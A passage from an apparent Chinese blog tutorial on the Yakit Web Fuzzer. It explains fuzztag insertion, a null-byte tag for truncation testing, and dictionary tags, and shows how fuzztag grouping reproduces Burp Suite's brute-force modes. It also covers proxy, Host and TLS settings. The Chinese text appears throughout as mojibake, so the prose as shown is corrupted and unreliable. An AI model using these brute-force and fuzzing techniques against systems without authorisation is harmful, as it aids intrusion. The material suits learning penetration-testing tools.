title="2ï¼‰å³é”®æ’å…¥fuzztag"></a>2ï¼‰å³é”®æ’å…¥fuzztag</h4><p>ä¸ä¹‹ç›¸å¯¹çš„ï¼ŒWeb Fuzzerä¹Ÿæä¾›äº†æ›´ç®€å•çš„æ–¹å¼æ¥æ’å…¥fuzztagï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨Web Fuzzerä¸­å³é”®é€‰æ‹©<strong>æ’å…¥æ ‡ç­¾/å­—å…¸</strong>å³å¯ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.16.31.png" style="zoom:50%;"><p>è¿™æ˜¯yakitæœ€è¿‘æ–°å¢çš„åŠŸèƒ½ï¼Œå½“ä½ åœ¨Web Fuzzerä¸­é¼ æ ‡ç‚¹é€‰äº†æŸä¸ªä½ç½®æ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªæ’å…¥æ ‡ç­¾çš„æ‚¬æµ®æ¡†ï¼Œåœ¨è¿™ä¸ªæ‚¬æµ®æ¡†ä¸­ä½ å¯ä»¥é€‰æ‹©æ’å…¥ä¸€äº›å¸¸è§çš„fuzztagã€‚</p><h4 id="3ï¼‰æ’å…¥ç©ºå­—èŠ‚æ ‡ç­¾ï¼šhexd-00"><a href="#3ï¼‰æ’å…¥ç©ºå­—èŠ‚æ ‡ç­¾ï¼šhexd-00" class="headerlink" title="3ï¼‰æ’å…¥ç©ºå­—èŠ‚æ ‡ç­¾ï¼šhexd(00)"></a>3ï¼‰æ’å…¥ç©ºå­—èŠ‚æ ‡ç­¾ï¼š<code>hexd(00)</code></h4><p><code>hexd(00)</code>å°†åœ¨æ‰€åœ¨ä½ç½®æ’å…¥ä¸€ä¸ªç©ºå­—èŠ‚ï¼Œå¯ä»¥ç”¨äºæµ‹è¯•ç©ºå­—èŠ‚æˆªæ–­æ¼æ´ã€‚è¿™å®é™…ä¸Šä¹Ÿä½“ç°äº†fuzztagçš„å¦å¤–ä¸€ä¸ªå¥½å¤„ï¼Œæˆ‘ä»¬ä¸éœ€è¦Burp Suiteçš„åå…­è¿›åˆ¶ç¼–è¾‘å™¨ï¼Œä¹Ÿå¯ä»¥è½»æ¾åœ°æ’å…¥åå…­è¿›åˆ¶æ•°æ®ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.17.10.png" style="zoom:50%;"><h4 id="4ï¼‰æ’å…¥ä¸´æ—¶å­—å…¸"><a href="#4ï¼‰æ’å…¥ä¸´æ—¶å­—å…¸" class="headerlink" title="4ï¼‰æ’å…¥ä¸´æ—¶å­—å…¸"></a>4ï¼‰æ’å…¥ä¸´æ—¶å­—å…¸</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.20.19.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.19.37.png" style="zoom:50%;"><p>è¿™ä¸ªåŠŸèƒ½å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹å­˜å‚¨åˆ°ä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œå¹¶æ’å…¥ä¸ºfuzztagï¼Œä»–æœ‰ä¸¤ä¸ªæ¨¡å¼ï¼Œä¸€ä¸ªæ˜¯æ’å…¥æ•´ä¸ªæ–‡æœ¬å†…å®¹ï¼Œå¦å¤–ä¸€ä¸ªåˆ™æ˜¯æŒ‰æ–‡ä»¶å†…å®¹çš„æ¯ä¸€è¡Œæ’å…¥ï¼ˆä¾‹å¦‚ç”¨æˆ·è¾“å…¥äº†5è¡Œå­—ç¬¦ä¸²ï¼Œåˆ™ä¼šå‘é€5ä¸ªè¯·æ±‚ï¼‰ã€‚</p><h4 id="5ï¼‰æ’å…¥æ¨¡ç³Šæµ‹è¯•å­—å…¸æ ‡ç­¾"><a href="#5ï¼‰æ’å…¥æ¨¡ç³Šæµ‹è¯•å­—å…¸æ ‡ç­¾" class="headerlink" title="5ï¼‰æ’å…¥æ¨¡ç³Šæµ‹è¯•å­—å…¸æ ‡ç­¾"></a>5ï¼‰æ’å…¥æ¨¡ç³Šæµ‹è¯•å­—å…¸æ ‡ç­¾</h4><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.23.06.png" alt="æˆªå±2024-12-25 16.23.06" style="zoom:50%;"><p>è¿™ä¸ªåŠŸèƒ½å®é™…ä¸Šæ˜¯ä¸yakitä¸­çš„å¦å¤–ä¸€ä¸ªæ¨¡å—ï¼špayloadçš„è”åŠ¨ã€‚å½“ä½ å†payloadä¸­å¯¼å…¥äº†å­—å…¸åï¼Œä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½ç‚¹å‡»é—ªç”µæŒ‰é’®å°†å­—å…¸ä¸­çš„å†…å®¹æŒ‰è¡Œæ’å…¥ä¸ºfuzztagã€‚</p><h4 id="6ï¼‰æ’å…¥çƒ­åŠ è½½æ ‡ç­¾"><a href="#6ï¼‰æ’å…¥çƒ­åŠ è½½æ ‡ç­¾" class="headerlink" title="6ï¼‰æ’å…¥çƒ­åŠ è½½æ ‡ç­¾"></a>6ï¼‰æ’å…¥çƒ­åŠ è½½æ ‡ç­¾</h4><p>çƒ­åŠ è½½çš„ä½¿ç”¨é—¨æ§›è¾ƒé«˜ã€‚</p><h4 id="7ï¼‰æ’å…¥æ–‡ä»¶æ ‡ç­¾"><a href="#7ï¼‰æ’å…¥æ–‡ä»¶æ ‡ç­¾" class="headerlink" title="7ï¼‰æ’å…¥æ–‡ä»¶æ ‡ç­¾"></a>7ï¼‰æ’å…¥æ–‡ä»¶æ ‡ç­¾</h4><p>è¿™ä¸ªåŠŸèƒ½ä¸<strong>æ’å…¥ä¸´æ—¶å­—å…¸</strong>ç±»ä¼¼ï¼Œä¸€å…±æœ‰ä¸‰ä¸ªæ¨¡å¼ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ’å…¥æ•´ä¸ªæ–‡æœ¬å†…å®¹ï¼Œç¬¬äºŒä¸ªæ˜¯æŒ‰æ–‡ä»¶å†…å®¹çš„æ¯ä¸€è¡Œæ’å…¥ï¼Œç¬¬ä¸‰ä¸ªåˆ™æ˜¯æŒ‰æ–‡ä»¶å¤¹ä¸‹çš„æ¯ä¸€ä¸ªæ–‡ä»¶æ’å…¥ï¼ˆä¾‹å¦‚è¯¥æ–‡ä»¶å¤¹ä¸‹ä¸€å…±æœ‰5ä¸ªæ–‡ä»¶ï¼Œåˆ™ä¼šå‘é€5ä¸ªè¯·æ±‚ï¼‰ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.28.38.png" style="zoom:50%;"><h3 id="12-2-4-çˆ†ç ´æ¨¡å¼"><a href="#12-2-4-çˆ†ç ´æ¨¡å¼" class="headerlink" title="12.2.4 çˆ†ç ´æ¨¡å¼"></a>12.2.4 çˆ†ç ´æ¨¡å¼</h3><p>Burp Suiteä¸­å­˜åœ¨å››ç§çˆ†ç ´æ¨¡å¼ï¼šSniperï¼ŒBattering ramï¼ŒPitchforkï¼ŒCluster bombã€‚</p><blockquote><p>1ã€Sinperï¼ˆç‹™å‡»æ‰‹ï¼‰</p><p>  sinperä½¿ç”¨ä¸€ä¸ªå­—å…¸ï¼Œä¸»è¦æ˜¯å°†æ ‡è®°çš„æ•°æ®è¿›è¡Œé€ä¸ªéå†æ›¿æ¢<br>          çˆ†ç ´æ¬¡æ•°=æ ‡è®°å­—æ®µæ•°*å­—å…¸å­—æ®µæ•°é‡</p><p>2ã€Battering ramï¼ˆæ”»åŸæ§Œï¼‰</p><p> Battering ramä½¿ç”¨ä¸€ä¸ªå­—å…¸ï¼Œå°†åŒ…å†…æ‰€æœ‰æ ‡è®°çš„æ•°æ®è¿›è¡ŒåŒæ—¶æ›¿æ¢å†å‘å‡º</p><p> çˆ†ç ´æ¬¡æ•°=å­—å…¸å­—æ®µæ•°é‡</p><p>3ã€Pitchforkï¼ˆå¹²è‰å‰ï¼‰</p><p>Pitchforkå¯¹æ¯ä¸ªæ ‡è®°å­—æ®µå•ç‹¬è®¾ç½®å­—å…¸ï¼ŒæŒ‰ç…§ä¸€ä¸€å¯¹åº”çš„å…³ç³»å–æœ€å°‘çš„ç»„åˆ</p><p>çˆ†ç ´æ¬¡æ•°=æœ€å°‘çš„å­—æ®µå­—æ®µæ•°</p><p>4ã€Cluster bombï¼ˆé›†æŸç‚¸å¼¹ï¼‰</p><p>Cluster bombä½¿ç”¨ç©·ä¸¾æ³•ï¼Œå¯¹æ¯ä¸ªæ ‡è®°å­—æ®µéƒ½éå†å­—å…¸</p><p>æ ‡è®°ä¸‰å¤„ï¼Œç¬¬ä¸€å¤„å­—å…¸3ä¸ªï¼Œç¬¬äºŒå¤„å­—å…¸2ä¸ªï¼Œç¬¬ä¸‰å¤„å­—å…¸3ä¸ªï¼Œçˆ†ç ´æ¬¡æ•°ï¼š3*2*3</p></blockquote><p>ä½†å®é™…ä¸Šæˆ‘ä»¬çœŸçš„éœ€è¦çˆ†ç ´æ¨¡å¼å—ï¼Ÿå®ƒæ˜¯ä¸å¯æ›¿ä»£çš„å—ï¼Ÿ</p><p>æˆ‘ä»¬å…ˆæ¥å‰–æä¸€ä¸‹è¿™å››ä¸ªçˆ†ç ´æ¨¡å¼çš„æœ¬è´¨ï¼š</p><ol><li>Sniperï¼šå•ä¸ªå‚æ•°çˆ†ç ´ï¼Œå¦‚æœæ­¤æ¨¡å¼ä¸‹å­˜åœ¨å¤šä¸ªå ä½ç¬¦ï¼Œåˆ™åªåŒæ—¶çˆ†ç ´ä¸€ä¸ªå ä½ç¬¦ï¼Œå…¶ä»–å ä½ç¬¦ä¿æŒä¸å˜ï¼Œä¾‹å¦‚ï¼š<code>{"key": "Â§valueÂ§", "key2": "Â§value2Â§"}</code>ï¼Œæ­¤æ—¶çˆ†ç ´æ—¶ä¼šå…ˆçˆ†ç ´valueï¼Œè€Œ<code>Â§value2Â§</code>åˆ™ä¿æŒä¸å˜ï¼Œå‘é€çš„åŒ…ä¸ºï¼š<code>{"key": "çˆ†ç ´å€¼", "key2": "value2"}</code></li><li>Battering ramï¼šå¤šä¸ªå‚æ•°åŒæ—¶ä½¿ç”¨ä¸€ä¸ªå­—å…¸çˆ†ç ´ï¼Œä¾‹å¦‚ï¼š<code>{"key": "Â§valueÂ§", "key2": "Â§value2Â§"}</code>ï¼Œæ­¤æ—¶çˆ†ç ´æ—¶ä¼šå…ˆåŒæ—¶çˆ†ç ´valueå’Œvalue2ï¼Œå‘é€çš„åŒ…ä¸ºï¼š<code>{"key": "çˆ†ç ´å€¼", "key2": "çˆ†ç ´å€¼"}</code></li><li>Pitchforkï¼šå¤šä¸ªå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä½¿ç”¨ä¸åŒå­—å…¸ï¼Œå­—å…¸é—´ä¸€ä¸€å¯¹åº”ï¼Œè¡Œæ•°ä¸ä¸€è‡´æ—¶åˆ™å–æœ€å°å€¼ã€‚ä¾‹å¦‚ï¼š<code>{"key": "Â§valueÂ§", "key2": "Â§value2Â§"}</code>ï¼Œä½¿ç”¨çš„ç¬¬ä¸€ä¸ªå­—å…¸ä¸º<code>1,2</code>ï¼Œç¬¬äºŒä¸ªå­—å…¸ä¸º<code>3,4</code>ï¼Œåˆ™å‘é€çš„åŒ…ä¸ºï¼š<code>{"key": "1", "key2": "3"}</code>ï¼Œ<code>{"key": "2", "key2": "4"}</code></li><li>Cluster bombï¼šå¤šä¸ªå‚æ•°åŒæ—¶çˆ†ç ´ï¼Œä½¿ç”¨ä¸åŒå­—å…¸ï¼Œå­—å…¸é—´åšç¬›å¡å°”ä¹˜ç§¯æ¨¡å¼ã€‚ä¾‹å¦‚ï¼š<code>{"key": "Â§valueÂ§", "key2": "Â§value2Â§"}</code>ï¼Œä½¿ç”¨çš„ç¬¬ä¸€ä¸ªå­—å…¸ä¸º<code>1,2</code>ï¼Œç¬¬äºŒä¸ªå­—å…¸ä¸º<code>3,4</code>ï¼Œåˆ™å‘é€çš„åŒ…ä¸ºï¼š<code>{"key": "1", "key2": "3"}</code>ï¼Œ<code>{"key": "1", "key2": "4"}</code>ï¼Œ<code>{"key": "2", "key2": "3"}</code>ï¼Œ<code>{"key": "2", "key2": "4"}</code></li></ol><p> æ ¹æ®ä¸Šè¿°çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°çˆ†ç ´æ¨¡å¼å®é™…ä¸Šä¸»è¦æœåŠ¡äºå¤šä¸ªå‚æ•°çˆ†ç ´ä¸”ä½¿ç”¨ä¸åŒå­—å…¸çš„æƒ…å†µï¼Œæˆ‘ä»¬æœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹å¼æ¥æ›¿ä»£çˆ†ç ´æ¨¡å¼å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥ä½¿ç”¨fuzztagæ¥å®ç°ã€‚</p><ul><li>é›†æŸç‚¸å¼¹æ¨¡å¼</li></ul><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹å¤šå‚æ•°çš„æƒ…å†µä¸‹fuzztagçš„é»˜è®¤è¡¨ç°ï¼Œå®é™…ä¸Šä»–æ˜¯ç±»ä¼¼äºCluster bombçˆ†ç ´æ¨¡å¼ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.43.23.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°ä¸€å…±å‘é€äº†4ä¸ªåŒ…ï¼Œå’ŒCluster bombçˆ†ç ´æ¨¡å¼ä¸€è‡´ã€‚</p><ul><li>æ”»åŸæ§Œæ¨¡å¼</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬è¦å¦‚ä½•ä½¿ç”¨fuzztagæ¥å®ç°Battering ramçˆ†ç ´æ¨¡å¼å‘¢ï¼Ÿæˆ‘ä»¬åªéœ€è¦åœ¨æ¯ä¸ªå‚æ•°çš„ä½ç½®æ’å…¥ç›¸åŒçš„fuzztagå³å¯ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.46.18.png" style="zoom:50%;"><p>ä½†æ˜¯æœ¬è´¨ä¸Šä»ç„¶æ˜¯é›†æŸç‚¸å¼¹æ¨¡å¼ã€‚è¿™é‡Œæˆ‘è§‰å¾—å®˜æ–¹æ–‡æ¡£è§£é‡Šæœ‰é”™è¯¯ã€‚å®é™…ä¸Šåº”è¯¥æ˜¯å€ŸåŠ©åˆ†ç»„çš„æ–¹å¼æ¥å®ç°ï¼Œåƒä¸‹é¢è¿™æ ·ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.48.14.png" alt="æˆªå±2024-12-25 16.48.14" style="zoom:50%;"><ul><li>å¹²è‰å‰æ¨¡å¼</li></ul><p>æˆ‘ä»¬å†æ¥çœ‹çœ‹å¦‚ä½•ä½¿ç”¨fuzztagå®ç°Pitchforkçˆ†ç ´æ¨¡å¼ï¼Œè¿™æ—¶å€™éœ€è¦å­¦ä¹ fuzztagçš„ä¸€ä¸ªå°å°çš„æ–°è¯­æ³•ã€‚æˆ‘ä»¬çŸ¥é“fuzztagå®ƒå¤§æ¦‚é•¿è¿™ä¸ªæ ·å­ï¼š<code>{{tagname(tagvalue)}}</code>ï¼Œä½†å®é™…ä¸Šæˆ‘ä»¬å¯ä»¥ç»™ä»–åˆ†ç»„ï¼Œå°±åƒè¿™ä¸ªæ ·å­ï¼š<code>{{tagname::1(tagvalue)}}</code>ã€‚</p><p>ä¸¤ä¸ªå†’å·åé¢çš„æ•°å­—è¡¨ç¤ºåˆ†ç»„ï¼Œåˆ†ç»„çš„æ„æ€æ˜¯ï¼š<strong>åŒä¸€ä¸ªåˆ†ç»„çš„fuzztagä¼šè¢«æ›¿æ¢ä¸ºåŒä¸€ä¸ª Index çš„å€¼</strong>ã€‚ä¾‹å¦‚æˆ‘ä»¬æƒ³è¦å®ç°Pitchforkçˆ†ç ´æ¨¡å¼ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨æ¯ä¸ªå‚æ•°çš„ä½ç½®æ’å…¥fuzztagï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªfuzztagåé¢åŠ ä¸Šç›¸åŒçš„åˆ†ç»„æ ‡è¯†å³å¯ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.51.54.png" style="zoom:50%;"><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2016.54.03.png" style="zoom:50%;"><p>æˆ‘ä»¬å¯ä»¥å‘ç°Burp suiteçš„çˆ†ç ´æ¨¡å¼å¹¶ä¸æ˜¯å¿…é¡»çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡fuzztagåŠ åˆ†ç»„çš„æ–¹å¼æ¥å®ç°æ›´åŠ çµæ´»çš„çˆ†ç ´æ¨¡å¼ã€‚</p><h2 id="12-3-é«˜çº§é…ç½®"><a href="#12-3-é«˜çº§é…ç½®" class="headerlink" title="12.3 é«˜çº§é…ç½®"></a>12.3 é«˜çº§é…ç½®</h2><p>çˆ†ç ´æ—¶ä½¿ç”¨ä»£ç†ï¼Œæˆ–è€…æˆ‘ä»¬éœ€è¦åœ¨çˆ†ç ´æ—¶ä½¿ç”¨å›½å¯†TLSç­‰åœºæ™¯ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¯¹Web Fuzzerè¿›è¡Œä¸€äº›é«˜çº§é…ç½®äº†ã€‚</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.00.43.png" style="zoom:50%;"><h3 id="12-3-1-å¼ºåˆ¶HTTPS"><a href="#12-3-1-å¼ºåˆ¶HTTPS" class="headerlink" title="12.3.1 å¼ºåˆ¶HTTPS"></a>12.3.1 å¼ºåˆ¶HTTPS</h3><p>å¼€å¯<strong>å¼ºåˆ¶HTTPS</strong>é€‰é¡¹ï¼Œå¯ä»¥ä½¿å¾—è¿™æ¬¡è¯·æ±‚å¼ºåˆ¶ä½¿ç”¨HTTPSåè®®è€ŒéHTTPåè®®è¿›è¡Œé€šä¿¡ï¼Œè¿™åœ¨æŸäº›ç½‘ç«™è¦æ±‚å¼ºåˆ¶ä½¿ç”¨HTTPSæ—¶éå¸¸æœ‰ç”¨ã€‚</p><h3 id="12-3-2-å›½å¯†TLS"><a href="#12-3-2-å›½å¯†TLS" class="headerlink" title="12.3.2 å›½å¯†TLS"></a>12.3.2 å›½å¯†TLS</h3><p>å¼€å¯<strong>å›½å¯†TLS</strong>é€‰é¡¹ï¼Œå¯ä»¥ä½¿å¾—è¿™æ¬¡è¯·æ±‚ä½¿ç”¨å›½å¯†TLSåè®®è¿›è¡Œé€šä¿¡ï¼Œå¯ä»¥åœ¨æŸäº›ç½‘ç«™è¦æ±‚ä½¿ç”¨å›½å¯†TLSè¿›è¡Œé€šä¿¡æ—¶ä½¿ç”¨ã€‚</p><h3 id="12-3-3-çœŸå®Host"><a href="#12-3-3-çœŸå®Host" class="headerlink" title="12.3.3 çœŸå®Host"></a>12.3.3 çœŸå®Host</h3><p>æˆ‘ä»¬çŸ¥é“ï¼ŒWeb Fuzzeråœ¨é»˜è®¤æƒ…å†µä¸‹ä¼šä»è¯·æ±‚åŒ…ä¸­æå–Hostè¯·æ±‚å¤´æ¥ä½œä¸ºæˆ‘ä»¬è¦é€šä¿¡ç›®æ ‡ï¼Œä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æŒ‡å®šHostè¯·æ±‚å¤´ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¡«å†™<strong>çœŸå®Host</strong>ï¼Œè¿™æ ·Web Fuzzerå°±ä¼šä½¿ç”¨æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šçš„çœŸå®Hostæ¥è¿›è¡Œé€šä¿¡ï¼Œè¿™åœ¨Hostç¢°æ’çš„åœºæ™¯ä¸‹éå¸¸æœ‰ç”¨ã€‚</p><h3 id="12-3-4-è®¾ç½®ä»£ç†"><a href="#12-3-4-è®¾ç½®ä»£ç†" class="headerlink" title="12.3.4 è®¾ç½®ä»£ç†"></a>12.3.4 è®¾ç½®ä»£ç†</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒWeb Fuzzerä¼šèµ°ç³»ç»Ÿä»£ç†æ¥è¿›è¡Œå‘åŒ…ã€‚ä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æŒ‡å®šä»£ç†ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¡«å†™<strong>è®¾ç½®ä»£ç†</strong>ï¼Œè¿™æ ·Web Fuzzerå°±ä¼šä½¿ç”¨æˆ‘ä»¬æ‰‹åŠ¨æŒ‡å®šçš„ä»£ç†æ¥è¿›è¡Œé€šä¿¡ï¼Œè¿™åœ¨è®¿é—®å†…ç½‘æœåŠ¡çš„åœºæ™¯ä¸‹éå¸¸æœ‰ç”¨ã€‚åœ¨æŒ‡å®šå¤šä¸ªä»£ç†çš„æƒ…å†µä¸‹ï¼ŒWeb Fuzzerä¼šæ™ºèƒ½æ‰¾åˆ°å¯ç”¨çš„ä»£ç†è¿›è¡Œè¯·æ±‚ã€‚</p><h3 id="12-3-5-ç¦ç”¨ç³»ç»Ÿä»£ç†"><a href="#12-3-5-ç¦ç”¨ç³»ç»Ÿä»£ç†" class="headerlink" title="12.3.5 ç¦ç”¨ç³»ç»Ÿä»£ç†"></a>12.3.5 ç¦ç”¨ç³»ç»Ÿä»£ç†</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒWeb Fuzzerä¼šèµ°ç³»ç»Ÿä»£ç†æ¥è¿›è¡Œå‘åŒ…ã€‚ä½†æ˜¯æœ‰æ—¶å€™æˆ‘ä»¬ä¸æƒ³ä½¿ç”¨ç³»ç»Ÿä»£ç†ï¼Œæˆ–è€…è¯´è¿™æ¬¡å‘åŒ…ä¸åº”è¯¥èµ°ç³»ç»Ÿä»£ç†ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥å¼€å¯<strong>ç¦ç”¨ç³»ç»Ÿä»£ç†</strong>é€‰é¡¹ã€‚</p><h3 id="12-3-6-å“åº”æ•°é‡é™åˆ¶"><a href="#12-3-6-å“åº”æ•°é‡é™åˆ¶" class="headerlink" title="12.3.6 å“åº”æ•°é‡é™åˆ¶"></a>12.3.6 å“åº”æ•°é‡é™åˆ¶</h3><p>å“åº”æ•°é‡é™åˆ¶ç”¨äºé™åˆ¶é¡µé¢ä¸­æœ€å¤šæ¸²æŸ“å¤šå°‘ä¸ªè¯·æ±‚å“åº”ï¼Œè¿™ä¸ªé™åˆ¶æ˜¯ç”±äºè¯·æ±‚å“åº”è¿‡å¤šæ—¶å¯èƒ½ä¼šå¯¹å‰ç«¯æ¸²æŸ“é€ æˆä¸€å®šçš„å‹åŠ›ï¼Œæ‰€ä»¥éœ€è¦å¯¹å…¶è¿›è¡Œé™åˆ¶ã€‚é™åˆ¶åå¦‚æœæƒ³è¦æŸ¥çœ‹æ‰€æœ‰å“åº”ï¼Œå¯ä»¥ç‚¹å‡»<strong>æŸ¥çœ‹å…¨éƒ¨</strong>æŒ‰é’®ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.05.52.png" style="zoom:50%;"><h3 id="12-3-7-å“åº”ä½“é•¿åº¦é™åˆ¶"><a href="#12-3-7-å“åº”ä½“é•¿åº¦é™åˆ¶" class="headerlink" title="12.3.7 å“åº”ä½“é•¿åº¦é™åˆ¶"></a>12.3.7 å“åº”ä½“é•¿åº¦é™åˆ¶</h3><p>å“åº”ä½“é•¿åº¦é™åˆ¶ç”¨äºé™åˆ¶é¡µé¢ä¸­æœ€å¤šæ¸²æŸ“çš„æœ€é•¿å“åº”é•¿åº¦ï¼Œè¿™ä¸ªé™åˆ¶æ˜¯ç”±äºå“åº”è¿‡å¤§æ—¶å¯èƒ½ä¼šå¯¹å‰ç«¯æ¸²æŸ“é€ æˆä¸€å®šçš„å‹åŠ›ï¼Œæ‰€ä»¥éœ€è¦å¯¹å…¶è¿›è¡Œé™åˆ¶ã€‚å½“å“åº”é•¿åº¦è¶…è¿‡é™åˆ¶æ—¶ï¼ŒWeb Fuzzer ä¼šè‡ªåŠ¨æˆªæ–­å“åº”ä½“ï¼Œå¹¶æ˜¾ç¤ºè¶…å¤§å“åº”ï¼Œå¦‚æœæƒ³è¦æŸ¥çœ‹å®Œæ•´å“åº”ï¼Œå¯ä»¥ç‚¹å‡»<strong>å®Œæ•´å“åº”</strong>æŒ‰é’®ï¼Œåœ¨æœ¬åœ°æŸ¥çœ‹ï¼š</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.10.38.png" style="zoom:50%;"><h2 id="12-4-è¯·æ±‚åŒ…é…ç½®"><a href="#12-4-è¯·æ±‚åŒ…é…ç½®" class="headerlink" title="12.4 è¯·æ±‚åŒ…é…ç½®"></a>12.4 è¯·æ±‚åŒ…é…ç½®</h2><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.11.58.png" style="zoom:50%;"><h3 id="12-4-1-Fuzztag-è¾…åŠ©"><a href="#12-4-1-Fuzztag-è¾…åŠ©" class="headerlink" title="12.4.1 Fuzztag è¾…åŠ©"></a>12.4.1 Fuzztag è¾…åŠ©</h3><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-25%2017.13.20.png" style="zoom:50%;"><p>è¿™ä¹Ÿæ˜¯ä¸€ä¸ªç”¨äºè¾…åŠ©æˆ‘ä»¬æ„é€  Fuzztag çš„å·¥å…·ã€‚æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸€äº›åŸºç¡€fuzztagï¼Œç„¶åå¯¹ä»–è¿›è¡Œä¿®æ”¹ï¼ŒæŸ¥çœ‹ç”Ÿæˆåçš„ payload ï¼Œå¹¶ä¸”è¿˜å¯ä»¥å°†å…¶æ·»åŠ åˆ°<strong>æ’å…¥æ ‡ç­¾</strong>æ‚¬æµ®æ¡†çš„å¸¸ç”¨æ ‡ç­¾ä¸­ã€‚</p><h3 id="12-4-2-æ¸²æŸ“-Fuzz"><a href="#12-4-2-æ¸²æŸ“-Fuzz" class="headerlink" title="12.4.2 æ¸²æŸ“ Fuzz"></a>12.4.2 æ¸²æŸ“ Fuzz</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<strong>æ¸²æŸ“ Fuzz</strong>é€‰é¡¹æ˜¯æ‰“å¼€å¹¶é€‰ä¸­æ ‡å‡†æ¨¡å¼çš„ã€‚ ä¸‰ä¸ªæ¨¡å¼çš„åŒºåˆ«å¦‚ä¸‹ï¼š</p><ol><li>å…³é—­ï¼šå…³é—­è¯¥é€‰é¡¹ä¹‹åï¼Œæ‰€æœ‰çš„ Fuzztag å°±ä¼šå¤±æ•ˆã€‚è¿™åœ¨æˆ‘ä»¬ä¸éœ€è¦Fuzzæ ‡ç­¾è€Œä¸”ä¸æŸäº›æ¨¡æ¿å¼•æ“è¯­æ³•å†²çªçš„æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ã€‚</li><li>æ ‡å‡†ï¼šæ ‡å‡†æ¨¡å¼ä¸‹ï¼ŒWeb Fuzzer ä¼šå¯¹è¯·æ±‚åŒ…ä¸­çš„Fuzzæ ‡ç­¾è¿›è¡Œæ¸²æŸ“ï¼Œæ¯ä¸ª Fuzztag å¿…é¡»ä¸¥æ ¼ç¬¦åˆ<code>{{tagname1({{tagname2(param)}})}}</code>çš„æ ¼å¼ã€‚</li><li>å…¼å®¹ï¼šå…¼å®¹æ¨¡å¼ä¸‹ï¼ŒWeb Fuzzer ä¼šå¯¹è¯·æ±‚åŒ…ä¸­çš„Fuzzæ ‡ç­¾è¿›è¡Œæ¸²æŸ“ï¼Œåœ¨åµŒå¥—fuzztagçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çœç•¥å¤šä½™çš„èŠ±æ‹¬å·ï¼Œä¾‹å¦‚ï¼š<code>{{tagname1(tagname2(param))}}</code>ã€‚</li></ol><h3 id="12-4-3-ä¸ä¿®å¤é•¿åº¦"><a href="#12-4-3-ä¸ä¿®å¤é•¿åº¦" 